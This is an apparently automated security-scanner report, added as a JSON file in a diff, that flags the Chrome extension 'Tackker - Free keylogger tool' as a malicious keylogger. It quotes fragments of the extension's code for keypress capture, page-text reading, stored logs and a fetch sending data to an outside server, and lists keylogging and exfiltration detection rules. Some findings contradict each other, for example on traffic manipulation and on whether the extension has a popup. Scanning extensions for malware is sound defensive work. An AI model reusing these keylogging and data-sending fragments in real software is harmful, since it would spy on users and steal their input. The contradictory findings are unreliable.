@@ -1,0 +1,1143 @@
+{
+  "jobId": "64637eff-14b9-4c4b-a7d6-2f5ccf145b00",
+  "agente1": {
+    "categoria": "Accessibility",
+    "proposito": "Extensión que promete registrar lo que escribes en el teclado y enviar datos a un servidor externo.",
+    "explicacion": "La extensión Tackker - Free keylogger tool está diseñada para capturar lo que escribes en el teclado y enviar esos datos a un servidor externo. En la evidencia, se detectó que escucha las teclas presionadas, lee el contenido visible de las páginas web, y envía toda esa información a un servidor en Internet. Además, tiene permiso para operar en todos los sitios web que visitas, lo que le permite acceder a tus datos sin que lo sepas. Estos comportamientos son completamente incompatibles con la función de una herramienta de accesibilidad normal y representan un riesgo grave para tu privacidad.\n\nRecomendación: Desinstala esta extensión de inmediato y evita usar herramientas que prometen registrar tu actividad sin tu consentimiento explícito.",
+    "veredicto_global": "maliciosa",
+    "respuestas_usuario": {
+      "puede_ver_historial": {
+        "razon": "Tiene permiso para operar en todos los sitios web y puede leer información de historial",
+        "valor": "si"
+      },
+      "puede_leer_formularios": {
+        "razon": "Escucha teclas y lee contenido visible de páginas web",
+        "valor": "si"
+      },
+      "puede_registrar_teclas": {
+        "razon": "Escucha teclas presionadas y las envía a un servidor externo",
+        "valor": "si"
+      },
+      "puede_modificar_paginas": {
+        "razon": "Puede reescribir cabeceras HTTP y redirigir la navegación",
+        "valor": "si"
+      },
+      "puede_espiar_sin_saberlo": {
+        "razon": "Escucha teclas y envía datos a servidores externos sin que lo sepas",
+        "valor": "si"
+      },
+      "puede_interceptar_trafico": {
+        "razon": "Puede redirigir la navegación y reescribir cabeceras HTTP",
+        "valor": "si"
+      },
+      "codigo_oculto_o_sospechoso": {
+        "razon": "Escucha teclas y envía datos a servidores externos sin que lo sepas",
+        "valor": "si"
+      },
+      "puede_capturar_contrasenas": {
+        "razon": "Puede leer información de formularios y enviarla a servidores externos",
+        "valor": "si"
+      },
+      "puede_ver_paginas_visitadas": {
+        "razon": "Tiene permiso para operar en todos los sitios web",
+        "valor": "si"
+      },
+      "puede_afectar_otras_extensiones": {
+        "razon": "No se encontró uso de APIs de gestión de extensiones",
+        "valor": "no_detectado"
+      }
+    },
+    "nivel_riesgo_inicial": "critico"
+  },
+  "crxHash": "31f0c80d3d6338f24590146fbc817cfcb84d6d71741eb61518e22fced5688a5d",
+  "estructura": {
+    "resultado1": [
+      {
+        "why": "The manifest declares a permission that grants sensitive browser or host capability.",
+        "line": 30,
+        "razon": "The manifest declares a permission that grants sensitive browser or host capability.",
+        "detail": "alarms (medium, weight=2, hostSensitive=false, permissions)",
+        "category": "manifest",
+        "filePath": "manifest.json",
+        "fileType": "manifest",
+        "severity": "medium",
+        "veredicto": "falso_positivo",
+        "confidence": 0.15,
+        "scoreImpact": 2,
+        "discoveryType": "permiso_chrome_manifest_riesgoso"
+      },
+      {
+        "why": "The manifest declares a permission that grants sensitive browser or host capability.",
+        "line": 19,
+        "razon": "The manifest declares a permission that grants sensitive browser or host capability.",
+        "detail": "<all_urls> (critical, weight=10, hostSensitive=true, host_permissions)",
+        "category": "manifest",
+        "filePath": "manifest.json",
+        "fileType": "manifest",
+        "severity": "critical",
+        "veredicto": "falso_positivo",
+        "confidence": 0.45,
+        "scoreImpact": 2,
+        "discoveryType": "permiso_chrome_manifest_riesgoso"
+      },
+      {
+        "why": "The script exists in the package but is not reachable from the constructed dependency graph.",
+        "line": 1,
+        "razon": "The script exists in the package but is not reachable from the constructed dependency graph.",
+        "detail": "JavaScript file is not reachable from manifest, HTML, imports, workers, or script injection graph",
+        "category": "normalization",
+        "filePath": "bootstrap.min.js",
+        "fileType": "library",
+        "severity": "low",
+        "veredicto": "falso_positivo",
+        "confidence": 0.35,
+        "scoreImpact": 1,
+        "discoveryType": "archivo_huerfano"
+      },
+      {
+        "why": "The script exists in the package but is not reachable from the constructed dependency graph.",
+        "line": 1,
+        "razon": "The script exists in the package but is not reachable from the constructed dependency graph.",
+        "detail": "JavaScript file is not reachable from manifest, HTML, imports, workers, or script injection graph",
+        "category": "normalization",
+        "filePath": "dataTables.min.js",
+        "fileType": "unknown",
+        "severity": "low",
+        "veredicto": "falso_positivo",
+        "confidence": 0.35,
+        "scoreImpact": 1,
+        "discoveryType": "archivo_huerfano"
+      },
+      {
+        "why": "The script exists in the package but is not reachable from the constructed dependency graph.",
+        "line": 1,
+        "razon": "The script exists in the package but is not reachable from the constructed dependency graph.",
+        "detail": "JavaScript file is not reachable from manifest, HTML, imports, workers, or script injection graph",
+        "category": "normalization",
+        "filePath": "dateRange.js",
+        "fileType": "unknown",
+        "severity": "low",
+        "veredicto": "falso_positivo",
+        "confidence": 0.35,
+        "scoreImpact": 1,
+        "discoveryType": "archivo_huerfano"
+      },
+      {
+        "why": "The script exists in the package but is not reachable from the constructed dependency graph.",
+        "line": 1,
+        "razon": "The script exists in the package but is not reachable from the constructed dependency graph.",
+        "detail": "JavaScript file is not reachable from manifest, HTML, imports, workers, or script injection graph",
+        "category": "normalization",
+        "filePath": "popup.js",
+        "fileType": "popup",
+        "severity": "low",
+        "veredicto": "falso_positivo",
+        "confidence": 0.35,
+        "scoreImpact": 1,
+        "discoveryType": "archivo_huerfano"
+      },
+      {
+        "why": "Uses chrome.storage for local persistence",
+        "line": 7,
+        "razon": "Uses chrome.storage for local persistence",
+        "detail": "chrome.storage.local.get",
+        "category": "persistence",
+        "filePath": "back.js",
+        "fileType": "background",
+        "severity": "medium",
+        "veredicto": "falso_positivo",
+        "confidence": 0.55,
+        "codeSnippet": "const getStorage = keys => new Promise(resolve => chrome.storage.local.get(keys, resolve));",
+        "scoreImpact": 2,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "Uses chrome.storage for local persistence",
+        "line": 8,
+        "razon": "Uses chrome.storage for local persistence",
+        "detail": "chrome.storage.local.set",
+        "category": "persistence",
+        "filePath": "back.js",
+        "fileType": "background",
+        "severity": "medium",
+        "veredicto": "falso_positivo",
+        "confidence": 0.55,
+        "codeSnippet": "const setStorage = items => new Promise(resolve => chrome.storage.local.set(items, resolve));",
+        "scoreImpact": 2,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "Communicates with external servers",
+        "line": 77,
+        "razon": "Communicates with external servers",
+        "detail": "fetch",
+        "category": "exfiltration",
+        "filePath": "back.js",
+        "fileType": "background",
+        "severity": "medium",
+        "veredicto": "falso_positivo",
+        "confidence": 0.55,
+        "codeSnippet": "const response = await fetch(\"https://www.tackker.com/send-data\", {",
+        "scoreImpact": 2,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "Creates alarms for background execution",
+        "line": 101,
+        "razon": "Creates alarms for background execution",
+        "detail": "chrome.alarms.create",
+        "category": "persistence",
+        "filePath": "back.js",
+        "fileType": "background",
+        "severity": "medium",
+        "veredicto": "falso_positivo",
+        "confidence": 0.55,
+        "codeSnippet": "chrome.alarms.create(\"periodicSend\", { periodInMinutes: 5 });",
+        "scoreImpact": 2,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "Reads page text content",
+        "line": 27,
+        "razon": "Reads page text content",
+        "detail": "t.innerText",
+        "category": "data_theft",
+        "filePath": "content.js",
+        "fileType": "content_script",
+        "severity": "high",
+        "veredicto": "positivo",
+        "confidence": 0.8,
+        "codeSnippet": "if (!0 === e) return t.innerText.trim().replace(/(\\n|\\r)+/g, \" \\n\")",
+        "scoreImpact": 5,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "Uses chrome.storage for local persistence",
+        "line": 44,
+        "razon": "Uses chrome.storage for local persistence",
+        "detail": "chrome.storage.local.get",
+        "category": "persistence",
+        "filePath": "content.js",
+        "fileType": "content_script",
+        "severity": "medium",
+        "veredicto": "positivo",
+        "confidence": 0.8,
+        "codeSnippet": "chrome.storage.local.get({logHistory: []}, function (result) {",
+        "scoreImpact": 2,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "Uses chrome.storage for local persistence",
+        "line": 73,
+        "razon": "Uses chrome.storage for local persistence",
+        "detail": "chrome.storage.local.set",
+        "category": "persistence",
+        "filePath": "content.js",
+        "fileType": "content_script",
+        "severity": "medium",
+        "veredicto": "positivo",
+        "confidence": 0.8,
+        "codeSnippet": "chrome.storage.local.set({logHistory: logHistory}, function () {",
+        "scoreImpact": 2,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "Uses chrome.storage for local persistence",
+        "line": 76,
+        "razon": "Uses chrome.storage for local persistence",
+        "detail": "chrome.storage.local.get",
+        "category": "persistence",
+        "filePath": "content.js",
+        "fileType": "content_script",
+        "severity": "medium",
+        "veredicto": "positivo",
+        "confidence": 0.8,
+        "codeSnippet": "chrome.storage.local.get('logHistory', function (result) {",
+        "scoreImpact": 2,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "Registers keyboard event listeners",
+        "line": 128,
+        "razon": "Registers keyboard event listeners",
+        "detail": "keypress",
+        "category": "keylogger",
+        "filePath": "content.js",
+        "fileType": "content_script",
+        "severity": "critical",
+        "veredicto": "positivo",
+        "confidence": 0.97,
+        "codeSnippet": "document.body.addEventListener(\"keypress\", KeyPress, !0);",
+        "scoreImpact": 7,
+        "discoveryType": "listener_teclado"
+      },
+      {
+        "why": "Uses chrome.storage for local persistence",
+        "line": 138,
+        "razon": "Uses chrome.storage for local persistence",
+        "detail": "chrome.storage.local.get",
+        "category": "persistence",
+        "filePath": "content.js",
+        "fileType": "content_script",
+        "severity": "medium",
+        "veredicto": "positivo",
+        "confidence": 0.8,
+        "codeSnippet": "chrome.storage.local.get(keys, resolve);",
+        "scoreImpact": 2,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "Uses chrome.storage for local persistence",
+        "line": 145,
+        "razon": "Uses chrome.storage for local persistence",
+        "detail": "chrome.storage.local.set",
+        "category": "persistence",
+        "filePath": "content.js",
+        "fileType": "content_script",
+        "severity": "medium",
+        "veredicto": "positivo",
+        "confidence": 0.8,
+        "codeSnippet": "chrome.storage.local.set(items, resolve);",
+        "scoreImpact": 2,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "Uses chrome.storage for local persistence",
+        "line": 257,
+        "razon": "Uses chrome.storage for local persistence",
+        "detail": "chrome.storage.local.get",
+        "category": "persistence",
+        "filePath": "content.js",
+        "fileType": "content_script",
+        "severity": "medium",
+        "veredicto": "positivo",
+        "confidence": 0.8,
+        "codeSnippet": "chrome.storage.local.get({urlHistory: []}, function (result) {",
+        "scoreImpact": 2,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "Communicates with external servers",
+        "line": 368,
+        "razon": "Communicates with external servers",
+        "detail": "fetch",
+        "category": "exfiltration",
+        "filePath": "content.js",
+        "fileType": "content_script",
+        "severity": "medium",
+        "veredicto": "positivo",
+        "confidence": 0.8,
+        "codeSnippet": "const response = await fetch(url);",
+        "scoreImpact": 2,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "Uses chrome.storage for local persistence",
+        "line": 446,
+        "razon": "Uses chrome.storage for local persistence",
+        "detail": "chrome.storage.local.get",
+        "category": "persistence",
+        "filePath": "content.js",
+        "fileType": "content_script",
+        "severity": "medium",
+        "veredicto": "positivo",
+        "confidence": 0.8,
+        "codeSnippet": "chrome.storage.local.get({urlHistory: []}, function (result) {",
+        "scoreImpact": 2,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "Uses chrome.storage for local persistence",
+        "line": 496,
+        "razon": "Uses chrome.storage for local persistence",
+        "detail": "chrome.storage.local.set",
+        "category": "persistence",
+        "filePath": "content.js",
+        "fileType": "content_script",
+        "severity": "medium",
+        "veredicto": "positivo",
+        "confidence": 0.8,
+        "codeSnippet": "chrome.storage.local.set({urlHistory: history}, function () {",
+        "scoreImpact": 2,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "Uses chrome.storage for local persistence",
+        "line": 497,
+        "razon": "Uses chrome.storage for local persistence",
+        "detail": "chrome.storage.local.get",
+        "category": "persistence",
+        "filePath": "content.js",
+        "fileType": "content_script",
+        "severity": "medium",
+        "veredicto": "positivo",
+        "confidence": 0.8,
+        "codeSnippet": "chrome.storage.local.get('urlHistory', function (result) {",
+        "scoreImpact": 2,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "window.location viaja hacia network sink fetch (servidor en Internet)",
+        "line": 368,
+        "razon": "window.location viaja hacia network sink fetch (servidor en Internet)",
+        "detail": "window.location viaja hacia network sink fetch (servidor en Internet)",
+        "category": "exfiltration",
+        "filePath": "content.js",
+        "fileType": "content_script",
+        "severity": "critical",
+        "veredicto": "positivo",
+        "confidence": 0.92,
+        "codeSnippet": "const response = await fetch(url);",
+        "scoreImpact": 10,
+        "discoveryType": "flujo_datos_a_red"
+      },
+      {
+        "why": "Modifies page content or UI (may be used for pet/theme features)",
+        "line": 444,
+        "razon": "Modifies page content or UI (may be used for pet/theme features)",
+        "detail": "innerHTML",
+        "category": "injection",
+        "filePath": "dataTables.min.js",
+        "fileType": "unknown",
+        "severity": "medium",
+        "veredicto": "falso_positivo",
+        "confidence": 0.55,
+        "codeSnippet": "c.innerHTML = F(a, b, d, \"display\")",
+        "scoreImpact": 2,
+        "discoveryType": "inyeccion_dom"
+      },
+      {
+        "why": "Modifies page content or UI (may be used for pet/theme features)",
+        "line": 497,
+        "razon": "Modifies page content or UI (may be used for pet/theme features)",
+        "detail": "innerHTML",
+        "category": "injection",
+        "filePath": "dataTables.min.js",
+        "fileType": "unknown",
+        "severity": "medium",
+        "veredicto": "falso_positivo",
+        "confidence": 0.55,
+        "codeSnippet": "!(c && !v.mRender && v.mData === p || f.isPlainObject(v.mData) && v.mData._ === p + \".display\")) n.innerHTML = F(a, b, p, \"display\");",
+        "scoreImpact": 2,
+        "discoveryType": "inyeccion_dom"
+      },
+      {
+        "why": "Modifies page content or UI (may be used for pet/theme features)",
+        "line": 932,
+        "razon": "Modifies page content or UI (may be used for pet/theme features)",
+        "detail": "innerHTML",
+        "category": "injection",
+        "filePath": "dataTables.min.js",
+        "fileType": "unknown",
+        "severity": "medium",
+        "veredicto": "falso_positivo",
+        "confidence": 0.55,
+        "codeSnippet": "p.indexOf && -1 !== p.indexOf(\"&\") && (xa.innerHTML = p, p = $b ? xa.textContent : xa.innerText);",
+        "scoreImpact": 2,
+        "discoveryType": "inyeccion_dom"
+      },
+      {
+        "why": "Reads page text content",
+        "line": 932,
+        "razon": "Reads page text content",
+        "detail": "xa.textContent",
+        "category": "data_theft",
+        "filePath": "dataTables.min.js",
+        "fileType": "unknown",
+        "severity": "high",
+        "veredicto": "falso_positivo",
+        "confidence": 0.55,
+        "codeSnippet": "p.indexOf && -1 !== p.indexOf(\"&\") && (xa.innerHTML = p, p = $b ? xa.textContent : xa.innerText);",
+        "scoreImpact": 5,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "Reads page text content",
+        "line": 932,
+        "razon": "Reads page text content",
+        "detail": "xa.innerText",
+        "category": "data_theft",
+        "filePath": "dataTables.min.js",
+        "fileType": "unknown",
+        "severity": "high",
+        "veredicto": "falso_positivo",
+        "confidence": 0.55,
+        "codeSnippet": "p.indexOf && -1 !== p.indexOf(\"&\") && (xa.innerHTML = p, p = $b ? xa.textContent : xa.innerText);",
+        "scoreImpact": 5,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "Modifies page content or UI (may be used for pet/theme features)",
+        "line": 1199,
+        "razon": "Modifies page content or UI (may be used for pet/theme features)",
+        "detail": "innerHTML",
+        "category": "injection",
+        "filePath": "dataTables.min.js",
+        "fileType": "unknown",
+        "severity": "medium",
+        "veredicto": "falso_positivo",
+        "confidence": 0.55,
+        "codeSnippet": "a.innerHTML = '<div class=\"dataTables_sizing\">' + C[b] + \"</div>\";",
+        "scoreImpact": 2,
+        "discoveryType": "inyeccion_dom"
+      },
+      {
+        "why": "Modifies page content or UI (may be used for pet/theme features)",
+        "line": 1205,
+        "razon": "Modifies page content or UI (may be used for pet/theme features)",
+        "detail": "innerHTML",
+        "category": "injection",
+        "filePath": "dataTables.min.js",
+        "fileType": "unknown",
+        "severity": "medium",
+        "veredicto": "falso_positivo",
+        "confidence": 0.55,
+        "codeSnippet": "a.innerHTML =",
+        "scoreImpact": 2,
+        "discoveryType": "inyeccion_dom"
+      },
+      {
+        "why": "Reads page text content",
+        "line": 1950,
+        "razon": "Reads page text content",
+        "detail": "xa.textContent",
+        "category": "data_theft",
+        "filePath": "dataTables.min.js",
+        "fileType": "unknown",
+        "severity": "high",
+        "veredicto": "falso_positivo",
+        "confidence": 0.55,
+        "codeSnippet": "}, ca = /\\[.*?\\]$/, W = /\\(\\)$/, Ta = q.util.escapeRegex, xa = f(\"<div>\")[0], $b = xa.textContent !== n,",
+        "scoreImpact": 5,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "The file is minified; line numbers are retained, but dense code can hide behavior.",
+        "line": 1,
+        "razon": "The file is minified; line numbers are retained, but dense code can hide behavior.",
+        "detail": "archivo minificado; line mappings preserved but findings may be dense",
+        "category": "normalization",
+        "filePath": "jquery-3.5.0.min.js",
+        "fileType": "content_script",
+        "severity": "low",
+        "veredicto": "falso_positivo",
+        "confidence": 0.45,
+        "scoreImpact": 1,
+        "discoveryType": "archivo_minificado"
+      },
+      {
+        "why": "Uses chrome.storage for local persistence",
+        "line": 34,
+        "razon": "Uses chrome.storage for local persistence",
+        "detail": "chrome.storage.local.get",
+        "category": "persistence",
+        "filePath": "popup.js",
+        "fileType": "popup",
+        "severity": "medium",
+        "veredicto": "falso_positivo",
+        "confidence": 0.55,
+        "codeSnippet": "chrome.storage.local.get(['key'], function (result) {",
+        "scoreImpact": 2,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "Uses chrome.storage for local persistence",
+        "line": 53,
+        "razon": "Uses chrome.storage for local persistence",
+        "detail": "chrome.storage.local.get",
+        "category": "persistence",
+        "filePath": "popup.js",
+        "fileType": "popup",
+        "severity": "medium",
+        "veredicto": "falso_positivo",
+        "confidence": 0.55,
+        "codeSnippet": "chrome.storage.local.get(['loggedIn'], function (result) {",
+        "scoreImpact": 2,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "Uses chrome.storage for local persistence",
+        "line": 65,
+        "razon": "Uses chrome.storage for local persistence",
+        "detail": "chrome.storage.local.set",
+        "category": "persistence",
+        "filePath": "popup.js",
+        "fileType": "popup",
+        "severity": "medium",
+        "veredicto": "falso_positivo",
+        "confidence": 0.55,
+        "codeSnippet": "chrome.storage.local.set({loggedIn: true}, function () {",
+        "scoreImpact": 2,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "Uses chrome.storage for local persistence",
+        "line": 96,
+        "razon": "Uses chrome.storage for local persistence",
+        "detail": "chrome.storage.local.get",
+        "category": "persistence",
+        "filePath": "popup.js",
+        "fileType": "popup",
+        "severity": "medium",
+        "veredicto": "falso_positivo",
+        "confidence": 0.55,
+        "codeSnippet": "chrome.storage.local.get(['appId'], function (result) {",
+        "scoreImpact": 2,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "Uses chrome.storage for local persistence",
+        "line": 108,
+        "razon": "Uses chrome.storage for local persistence",
+        "detail": "chrome.storage.local.set",
+        "category": "persistence",
+        "filePath": "popup.js",
+        "fileType": "popup",
+        "severity": "medium",
+        "veredicto": "falso_positivo",
+        "confidence": 0.55,
+        "codeSnippet": "chrome.storage.local.set({appId: xmlHttp.responseText}, function () {",
+        "scoreImpact": 2,
+        "discoveryType": "funcion_javascript_riesgosa"
+      },
+      {
+        "why": "The extension declares a Chrome API permission that static analysis did not observe in reachable code.",
+        "line": 29,
+        "razon": "The extension declares a Chrome API permission that static analysis did not observe in reachable code.",
+        "detail": "unlimitedStorage",
+        "category": "manifest",
+        "filePath": "manifest.json",
+        "fileType": "manifest",
+        "severity": "medium",
+        "veredicto": "positivo",
+        "confidence": 0.75,
+        "scoreImpact": 2,
+        "discoveryType": "permiso_chrome_manifest_no_usado"
+      },
+      {
+        "why": "Multiple suspicious signals co-occur in a way that materially increases malware likelihood.",
+        "line": 128,
+        "razon": "Multiple suspicious signals co-occur in a way that materially increases malware likelihood.",
+        "detail": "keyboard listener (keypress) + network sink in same file — keylogger pattern",
+        "category": "correlation",
+        "filePath": "content.js",
+        "fileType": "content_script",
+        "severity": "critical",
+        "veredicto": "positivo",
+        "confidence": 0.95,
+        "scoreImpact": 8,
+        "discoveryType": "correlacion_riesgo"
+      },
+      {
+        "why": "Multiple suspicious signals co-occur in a way that materially increases malware likelihood.",
+        "line": 368,
+        "razon": "Multiple suspicious signals co-occur in a way that materially increases malware likelihood.",
+        "detail": "AST-detected sensitive-data flow + <all_urls> host access — extension can read & exfiltrate from every site",
+        "category": "correlation",
+        "filePath": "content.js",
+        "fileType": "content_script",
+        "severity": "critical",
+        "veredicto": "positivo",
+        "confidence": 0.92,
+        "scoreImpact": 2,
+        "discoveryType": "correlacion_riesgo"
+      },
+      {
+        "why": "Multiple suspicious signals co-occur in a way that materially increases malware likelihood.",
+        "line": 1,
+        "razon": "Multiple suspicious signals co-occur in a way that materially increases malware likelihood.",
+        "detail": "extension declares content_scripts on <all_urls>/*://*/* but has no popup, options, sandbox, or override pages — runs invisibly across all browsing",
+        "category": "correlation",
+        "filePath": "manifest.json",
+        "fileType": "manifest",
+        "severity": "high",
+        "veredicto": "positivo",
+        "confidence": 0.83,
+        "scoreImpact": 2,
+        "discoveryType": "correlacion_riesgo"
+      },
+      {
+        "why": "Multiple suspicious signals co-occur in a way that materially increases malware likelihood.",
+        "line": 1,
+        "razon": "Multiple suspicious signals co-occur in a way that materially increases malware likelihood.",
+        "detail": "cookies/<all_urls> permission + suspicious external domain + network sink — possible exfiltration path even without observed cookie read",
+        "category": "correlation",
+        "filePath": "manifest.json",
+        "fileType": "manifest",
+        "severity": "critical",
+        "veredicto": "positivo",
+        "confidence": 0.85,
+        "scoreImpact": 2,
+        "discoveryType": "correlacion_riesgo"
+      }
+    ],
+    "resultado2_unknown": [],
+    "resultado2_priority": []
+  },
+  "extensionId": "upload-1779231363840-ekpkdmohpdnebfedjjfklhpefgpgaaji",
+  "extensionName": "Tackker - Free keylogger tool",
+  "resumen_usuario": [
+    {
+      "id": "keylogging",
+      "estado": "critico",
+      "titulo": "Keylogging y captura de teclado",
+      "resumen": "La extensión captura lo que escribes y lo envía a un servidor externo — comportamiento de keylogger.",
+      "evidencias": [
+        "Está escuchando lo que escribes en el teclado.",
+        "También detectamos envío de datos hacia servidores externos.",
+        "Listener de teclado o entrada en content.js:128.",
+        "Datos capturados del usuario viajan hacia un servidor externo (content.js:368).",
+        "Combinación compatible con keylogging en content.js:128."
+      ],
+      "hallazgos_codigo": [
+        {
+          "line": 128,
+          "texto": "Listener de teclado o entrada en content.js:128.",
+          "filePath": "content.js",
+          "fileType": "content script",
+          "codeSnippet": "document.body.addEventListener(\"keypress\", KeyPress, !0);"
+        },
+        {
+          "line": 368,
+          "texto": "Datos capturados del usuario viajan hacia un servidor externo (content.js:368).",
+          "filePath": "content.js",
+          "fileType": "content script",
+          "codeSnippet": "const response = await fetch(url);"
+        },
+        {
+          "line": 128,
+          "texto": "Combinación compatible con keylogging en content.js:128.",
+          "filePath": "content.js",
+          "fileType": "content script"
+        }
+      ],
+      "reglas_activadas": [
+        "keylog.keyboard_listener",
+        "keylog.network_exfil",
+        "keylog.correlation_keylogger"
+      ],
+      "preguntas_responde": [
+        "¿Puede registrar teclas que escribo?",
+        "¿Escucha todos los eventos del teclado?",
+        "¿Puede capturar texto antes de enviarlo?",
+        "¿Puede detectar combinaciones de teclas o atajos?"
+      ]
+    },
+    {
+      "id": "lectura_informacion",
+      "estado": "critico",
+      "titulo": "Lectura de información en páginas",
+      "resumen": "Detectamos que la extensión lee información de las páginas que visitas y la envía a un servidor externo.",
+      "evidencias": [
+        "Información leída de páginas viaja hacia servidores externos.",
+        "Lee el contenido visible de las páginas (textos, formularios, elementos de la página).",
+        "Los content scripts pueden leer o inspeccionar el DOM de las páginas donde corren.",
+        "Puede leer el texto y contenido visible de las páginas que visitas (content.js:27).",
+        "Puede observar lo que escribes en el teclado mientras navegas (content.js:128)."
+      ],
+      "hallazgos_codigo": [
+        {
+          "line": 27,
+          "texto": "Puede leer el texto y contenido visible de las páginas que visitas (content.js:27).",
+          "filePath": "content.js",
+          "fileType": "content script",
+          "codeSnippet": "if (!0 === e) return t.innerText.trim().replace(/(\\n|\\r)+/g, \" \\n\")"
+        },
+        {
+          "line": 128,
+          "texto": "Puede observar lo que escribes en el teclado mientras navegas (content.js:128).",
+          "filePath": "content.js",
+          "fileType": "content script",
+          "codeSnippet": "document.body.addEventListener(\"keypress\", KeyPress, !0);"
+        },
+        {
+          "line": 368,
+          "texto": "Información leída de la página viaja hacia un servidor externo (content.js:368).",
+          "filePath": "content.js",
+          "fileType": "content script",
+          "codeSnippet": "const response = await fetch(url);"
+        }
+      ],
+      "reglas_activadas": [
+        "read_info.dom_selectors",
+        "read_info.input_or_keyboard_listener",
+        "read_info.sensitive_flow"
+      ],
+      "preguntas_responde": [
+        "¿Puede leer texto dentro de páginas web?",
+        "¿Puede leer mensajes, correos o documentos abiertos en el navegador?",
+        "¿Puede leer contenido escrito en formularios?",
+        "¿Puede inspeccionar información sensible mostrada en pantalla?",
+        "¿Puede acceder al contenido completo de una página?"
+      ]
+    },
+    {
+      "id": "captura_credenciales",
+      "estado": "capacidad",
+      "titulo": "Contraseñas, tokens y sesiones",
+      "resumen": "Vimos acceso a almacenamiento donde podrían guardarse tokens o datos de sesión.",
+      "evidencias": [
+        "Señal de tokens o estado de sesión en almacenamiento en content.js:44.",
+        "Señal de tokens o estado de sesión en almacenamiento en content.js:73.",
+        "Señal de tokens o estado de sesión en almacenamiento en content.js:76.",
+        "Señal de tokens o estado de sesión en almacenamiento en content.js:138.",
+        "Señal de tokens o estado de sesión en almacenamiento en content.js:145."
+      ],
+      "hallazgos_codigo": [
+        {
+          "line": 44,
+          "texto": "Señal de tokens o estado de sesión en almacenamiento en content.js:44.",
+          "filePath": "content.js",
+          "fileType": "content script",
+          "codeSnippet": "chrome.storage.local.get({logHistory: []}, function (result) {"
+        },
+        {
+          "line": 73,
+          "texto": "Señal de tokens o estado de sesión en almacenamiento en content.js:73.",
+          "filePath": "content.js",
+          "fileType": "content script",
+          "codeSnippet": "chrome.storage.local.set({logHistory: logHistory}, function () {"
+        },
+        {
+          "line": 76,
+          "texto": "Señal de tokens o estado de sesión en almacenamiento en content.js:76.",
+          "filePath": "content.js",
+          "fileType": "content script",
+          "codeSnippet": "chrome.storage.local.get('logHistory', function (result) {"
+        },
+        {
+          "line": 138,
+          "texto": "Señal de tokens o estado de sesión en almacenamiento en content.js:138.",
+          "filePath": "content.js",
+          "fileType": "content script",
+          "codeSnippet": "chrome.storage.local.get(keys, resolve);"
+        },
+        {
+          "line": 145,
+          "texto": "Señal de tokens o estado de sesión en almacenamiento en content.js:145.",
+          "filePath": "content.js",
+          "fileType": "content script",
+          "codeSnippet": "chrome.storage.local.set(items, resolve);"
+        },
+        {
+          "line": 257,
+          "texto": "Señal de tokens o estado de sesión en almacenamiento en content.js:257.",
+          "filePath": "content.js",
+          "fileType": "content script",
+          "codeSnippet": "chrome.storage.local.get({urlHistory: []}, function (result) {"
+        },
+        {
+          "line": 446,
+          "texto": "Señal de tokens o estado de sesión en almacenamiento en content.js:446.",
+          "filePath": "content.js",
+          "fileType": "content script",
+          "codeSnippet": "chrome.storage.local.get({urlHistory: []}, function (result) {"
+        },
+        {
+          "line": 496,
+          "texto": "Señal de tokens o estado de sesión en almacenamiento en content.js:496.",
+          "filePath": "content.js",
+          "fileType": "content script",
+          "codeSnippet": "chrome.storage.local.set({urlHistory: history}, function () {"
+        },
+        {
+          "line": 497,
+          "texto": "Señal de tokens o estado de sesión en almacenamiento en content.js:497.",
+          "filePath": "content.js",
+          "fileType": "content script",
+          "codeSnippet": "chrome.storage.local.get('urlHistory', function (result) {"
+        },
+        {
+          "line": 1,
+          "texto": "Combinación de señales sobre credenciales/sesión en manifest.json:1.",
+          "filePath": "manifest.json",
+          "fileType": "manifest"
+        }
+      ],
+      "reglas_activadas": [
+        "creds.auth_storage",
+        "creds.correlation_session_exfil"
+      ],
+      "preguntas_responde": [
+        "¿Puede capturar contraseñas?",
+        "¿Puede leer usuarios y sesiones activas?",
+        "¿Puede interceptar formularios antes de ser enviados?",
+        "¿Puede capturar tokens de autenticación?",
+        "¿Puede acceder a cookies de sesión?"
+      ]
+    },
+    {
+      "id": "manipulacion_trafico",
+      "estado": "capacidad",
+      "titulo": "Manipulación de tráfico",
+      "resumen": "No vimos permisos fuertes de manipulación de tráfico.",
+      "evidencias": [
+        "Reescribe cabeceras HTTP (Authorization, Cookie, Referer...).",
+        "Redirige la navegación a otras URLs.",
+        "Redirige la navegación del usuario en content.js:368.",
+        "Manipula cabeceras de petición/respuesta (Authorization, Cookie, Referer...) en manifest.json:1."
+      ],
+      "hallazgos_codigo": [
+        {
+          "line": 368,
+          "texto": "Redirige la navegación del usuario en content.js:368.",
+          "filePath": "content.js",
+          "fileType": "content script",
+          "codeSnippet": "const response = await fetch(url);"
+        },
+        {
+          "line": 1,
+          "texto": "Manipula cabeceras de petición/respuesta (Authorization, Cookie, Referer...) en manifest.json:1.",
+          "filePath": "manifest.json",
+          "fileType": "manifest"
+        }
+      ],
+      "reglas_activadas": [
+        "traffic.redirect_pattern",
+        "traffic.header_rewrite"
